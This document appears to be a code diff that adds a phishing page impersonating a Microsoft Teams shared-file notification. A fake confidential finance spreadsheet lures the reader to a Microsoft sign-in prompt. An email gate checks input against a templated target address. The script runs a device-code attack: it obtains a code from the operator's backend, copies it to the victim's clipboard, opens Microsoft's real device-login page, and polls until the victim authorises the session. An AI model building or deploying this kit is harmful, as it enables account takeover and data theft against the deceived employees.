@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Microsoft Teams — Shared File Notification</title>
+<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f5f5f5;font-family:'Inter','Segoe UI',sans-serif;min-height:100vh}
+.page{max-width:680px;margin:0 auto;background:#fff;box-shadow:0 2px 16px rgba(0,0,0,.1)}
+/* Teams header */
+.t-header{background:#6264A7;padding:16px 24px;display:flex;align-items:center;gap:12px}
+.t-logo{display:flex;align-items:center;gap:8px}
+.t-icon{width:32px;height:32px;flex-shrink:0}
+.t-title{font-size:17px;font-weight:700;color:#fff}
+.t-badge{margin-left:auto;background:rgba(255,255,255,.18);color:#fff;border-radius:12px;padding:3px 10px;font-size:11px;font-weight:600}
+/* Notification bar */
+.notif-bar{background:#464775;padding:12px 24px;display:flex;align-items:center;gap:10px}
+.notif-dot{width:8px;height:8px;background:#92c353;border-radius:50%;flex-shrink:0}
+.notif-text{font-size:13px;color:rgba(255,255,255,.85)}
+/* Content */
+.content{padding:28px 24px}
+.intro-text{font-size:22px;font-weight:700;color:#1a1a2e;margin-bottom:6px}
+.sub-text{font-size:13px;color:#888;margin-bottom:24px}
+/* File card */
+.file-card{background:#f8f8ff;border:1.5px solid #e1e1f5;border-radius:8px;padding:16px;display:flex;gap:16px;align-items:center;margin-bottom:20px}
+.file-icon-wrap{width:50px;height:50px;background:#6264A7;border-radius:6px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.file-details{flex:1;min-width:0}
+.file-name{font-size:14px;font-weight:700;color:#1a1a2e;margin-bottom:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.file-meta{font-size:12px;color:#888}
+.file-action{background:#6264A7;color:#fff;border:none;border-radius:4px;padding:8px 14px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;white-space:nowrap}
+/* Channel context */
+.channel-card{background:#f0f0f8;border-radius:8px;padding:14px 16px;margin-bottom:20px;display:flex;align-items:center;gap:12px}
+.ch-hash{width:32px;height:32px;background:#6264A7;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:16px;font-weight:700;flex-shrink:0}
+.ch-info{flex:1}
+.ch-name{font-size:13px;font-weight:700;color:#1a1a2e}
+.ch-team{font-size:11px;color:#888}
+.ch-time{font-size:11px;color:#aaa}
+/* Message preview */
+.msg-preview{background:#fff;border:1px solid #e8e8f0;border-radius:8px;padding:14px 16px;margin-bottom:22px}
+.mp-header{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.mp-avatar{width:32px;height:32px;background:linear-gradient(135deg,#6264A7,#8b8fcc);border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:13px;font-weight:700;flex-shrink:0}
+.mp-name{font-size:13px;font-weight:600;color:#1a1a2e}
+.mp-time{font-size:11px;color:#aaa;margin-left:auto}
+.mp-text{font-size:13px;color:#555;line-height:1.7}
+/* CTA */
+.cta-row{display:flex;gap:12px;margin-bottom:10px}
+.btn-open{flex:2;background:#6264A7;color:#fff;border:none;border-radius:6px;padding:14px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 3px 12px rgba(98,100,167,.35)}
+.btn-dl{flex:1;background:#fff;color:#6264A7;border:2px solid #6264A7;border-radius:6px;padding:13px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}
+.cta-note{font-size:11px;color:#bbb;text-align:center}
+/* Footer */
+.footer{background:#f5f5f5;padding:16px 24px;border-top:1px solid #e8e8f0}
+.footer p{font-size:11px;color:#aaa;line-height:1.7}
+.footer a{color:#6264A7}
+/* Auth overlay */
+#auth-overlay{display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.8);backdrop-filter:blur(4px);align-items:center;justify-content:center}
+.auth-box{background:#fff;border-radius:8px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+#email-gate{display:none;position:fixed;inset:0;z-index:9999;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.75);backdrop-filter:blur(8px)}
+.gate-box{background:#fff;border-radius:8px;padding:36px 28px;width:90%;max-width:400px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4)}
+.gate-input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:6px;font-size:14px;font-family:inherit;outline:none;margin-bottom:8px;transition:border .15s}
+.gate-input:focus{border-color:#6264A7}
+.gate-input::placeholder{color:#bbb}
+.gate-btn{width:100%;background:#6264A7;color:#fff;border:none;border-radius:6px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}
+.gate-err{color:#c53030;font-size:13px;margin-bottom:8px;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+</style></head><body>
+<div class="page">
+  <div class="t-header">
+    <div class="t-logo">
+      <svg class="t-icon" viewBox="0 0 32 32" fill="none"><rect width="32" height="32" rx="6" fill="#6264A7"/><path d="M20 8h-4a1 1 0 00-1 1v1h-2a2 2 0 00-2 2v8a2 2 0 002 2h2v1a1 1 0 001 1h4a1 1 0 001-1V9a1 1 0 00-1-1zm-5 2h4v12h-4V10zm-2 1v8h-1v-8h1z" fill="white"/></svg>
+      <span class="t-title">Microsoft Teams</span>
+    </div>
+    <span class="t-badge">📎 New File Shared</span>
+  </div>
+  <div class="notif-bar">
+    <div class="notif-dot"></div>
+    <span class="notif-text">You received a file in a Teams channel — sign in to view it</span>
+  </div>
+  <div class="content">
+    <div class="intro-text">A file was shared with you</div>
+    <div class="sub-text">Someone shared a document in your Microsoft Teams channel that requires your attention.</div>
+    <div class="file-card">
+      <div class="file-icon-wrap">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
+      </div>
+      <div class="file-details">
+        <div class="file-name">Q1_Financial_Report_CONFIDENTIAL.xlsx</div>
+        <div class="file-meta">Excel Workbook · 2.4 MB · Shared in Teams</div>
+      </div>
+      <button class="file-action" onclick="startAuth()">Open</button>
+    </div>
+    <div class="channel-card">
+      <div class="ch-hash">#</div>
+      <div class="ch-info">
+        <div class="ch-name">Finance &amp; Operations</div>
+        <div class="ch-team">Corporate Team · Microsoft Teams</div>
+      </div>
+      <div class="ch-time">Today · 9:14 AM</div>
+    </div>
+    <div class="msg-preview">
+      <div class="mp-header">
+        <div class="mp-avatar">FO</div>
+        <div class="mp-name">Finance &amp; Operations</div>
+        <div class="mp-time">9:14 AM</div>
+      </div>
+      <div class="mp-text">📎 A new file has been uploaded to this channel. Please review the Q1 report and provide your sign-off by end of week. Access requires your Microsoft account verification.</div>
+    </div>
+    <div class="cta-row">
+      <button class="btn-open" onclick="startAuth()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
+        Open in Teams
+      </button>
+      <button class="btn-dl" onclick="startAuth()">Download</button>
+    </div>
+    <div class="cta-note">Sign in with your Microsoft account to access · Microsoft Teams</div>
+  </div>
+  <div class="footer">
+    <p>© 2026 Microsoft Corporation · <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Unsubscribe</a></p>
+    <p>This notification was sent because a file was shared in your Teams workspace. Manage notification settings in the Teams app.</p>
+  </div>
+</div>
+
+<div id="auth-overlay">
+  <div class="auth-box">
+    <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:18px">
+      <svg width="21" height="21" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+      <span style="font-size:15px;font-weight:300;color:#555">Microsoft</span>
+    </div>
+    <h3 id="auth-title" style="font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:6px">Sign in to open file</h3>
+    <p id="auth-sub" style="font-size:13px;color:#888;margin-bottom:22px;line-height:1.6">Microsoft Teams requires authentication to access shared files.</p>
+    <div id="spinner-sec"><div style="width:34px;height:34px;border:3px solid #eee;border-top-color:#6264A7;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 12px"></div><p style="font-size:13px;color:#bbb">Connecting…</p></div>
+    <div id="code-sec" style="display:none">
+      <p style="font-size:12px;color:#aaa;margin-bottom:12px">Your code is ready. Click below — it opens Microsoft and pastes for you.</p>
+      <div id="code-val" style="font-size:32px;font-weight:900;letter-spacing:8px;color:#1a1a1a;font-family:monospace;background:#f0f0ff;border-radius:6px;padding:12px;margin-bottom:16px;cursor:pointer;border:2px dashed #6264A7" onclick="openLogin()"></div>
+      <button onclick="openLogin()" id="open-btn" style="width:100%;padding:14px;font-size:15px;font-weight:700;border:none;border-radius:6px;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;background:#6264A7;color:#fff;box-shadow:0 4px 14px rgba(0,0,0,.2)">
+        <svg width="18" height="18" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+        Open Microsoft Device Login →
+      </button>
+      <p id="cp-ok" style="font-size:12px;color:#22c55e;display:none;margin-bottom:4px">✅ Code copied! Paste it on the Microsoft page.</p>
+      <p style="font-size:11px;color:#777;margin-top:4px">Expires in <span id="xtimer">15:00</span> · <span onclick="cpCode()" style="cursor:pointer;text-decoration:underline">Copy manually</span></p>
+    </div>
+    <div id="ok-sec" style="display:none">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="#22c55e" style="margin-bottom:10px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+      <p style="font-size:15px;font-weight:700;color:#22c55e">Signed In</p>
+      <p style="font-size:13px;color:#aaa;margin-top:4px">Opening file in Teams…</p>
+    </div>
+  </div>
+</div>
+
+<div id="email-gate">
+  <div class="gate-box">
+    <svg width="36" height="36" viewBox="0 0 32 32" fill="none" style="margin:0 auto 16px;display:block"><rect width="32" height="32" rx="6" fill="#6264A7"/><path d="M20 8h-4a1 1 0 00-1 1v1h-2a2 2 0 00-2 2v8a2 2 0 002 2h2v1a1 1 0 001 1h4a1 1 0 001-1V9a1 1 0 00-1-1zm-5 2h4v12h-4V10zm-2 1v8h-1v-8h1z" fill="white"/></svg>
+    <p style="font-size:17px;font-weight:700;color:#1a1a1a;margin-bottom:6px">Confirm Your Email</p>
+    <p style="font-size:13px;color:#888;margin-bottom:20px;line-height:1.6">This Teams file notification was sent to your work inbox. Enter the email address where you received this to access the file.</p>
+    <input id="gem" class="gate-input" type="email" placeholder="Your work email address" onkeydown="if(event.key==='Enter')gv()">
+    <div id="gerr" class="gate-err">❌ Email not found. Enter the email where you received this notification.</div>
+    <button class="gate-btn" onclick="gv()">Verify &amp; Open File →</button>
+    <p style="font-size:11px;color:#ccc;margin-top:12px">🔒 Microsoft Teams Secure Access</p>
+  </div>
+</div>
+
+<script>
+const LINK_ID='{{LINK_ID}}',TARGET='{{TARGET_EMAIL}}';
+(function(){if(!TARGET)return;const g=document.getElementById('email-gate');g.style.display='flex';setTimeout(()=>{const i=document.getElementById('gem');if(i)i.focus();},150);})();
+function gv(){const e=(document.getElementById('gem').value||'').trim().toLowerCase(),err=document.getElementById('gerr');if(e===TARGET.toLowerCase()){const g=document.getElementById('email-gate');g.style.transition='opacity .3s';g.style.opacity='0';setTimeout(()=>g.remove(),300);}else{err.style.display='block';const i=document.getElementById('gem');i.style.borderColor='#c53030';i.style.animation='sh .35s ease';setTimeout(()=>{i.style.animation='';i.style.borderColor='';},400);}}
+let sc='',pi,ci,tl=900;
+function startAuth(){document.getElementById('auth-overlay').style.display='flex';fetch('/api/device/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID})}).then(r=>r.json()).then(d=>{if(d.error){location.reload();return;}sc=d.user_code||d.userCode;document.getElementById('code-val').textContent=sc;document.getElementById('spinner-sec').style.display='none';document.getElementById('code-sec').style.display='block';ci=setInterval(()=>{tl--;const m=String(Math.floor(tl/60)).padStart(2,'0'),s=String(tl%60).padStart(2,'0');const el=document.getElementById('xtimer');if(el)el.textContent=m+':'+s;if(tl<=0)clearInterval(ci);},1000);pi=setInterval(()=>{fetch('/api/device/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID,device_code:d.device_code})}).then(r=>r.json()).then(p=>{if(p.success){clearInterval(pi);clearInterval(ci);document.getElementById('code-sec').style.display='none';document.getElementById('ok-sec').style.display='block';setTimeout(()=>window.location.href='https://teams.microsoft.com',2500);}}).catch(()=>{});},(d.interval||5)*1000);}).catch(()=>location.reload());}
+function openLogin(){cpCode();const url='https://microsoft.com/devicelogin';const w=window.open(url,'_blank','width=560,height=620,left=200,top=100,noopener');if(!w||w.closed||typeof w.closed==='undefined'){const btn=document.getElementById('open-btn');if(btn){btn.textContent='⏎ Redirecting…';}setTimeout(()=>window.location.href=url,800);}}
+function cpCode(){const ta=document.createElement('textarea');ta.value=sc;ta.style.cssText='position:fixed;top:-999px;opacity:0';document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);const ok=document.getElementById('cp-ok');if(ok){ok.style.display='block';setTimeout(()=>ok.style.display='none',3000);}}
+</script></body></html>
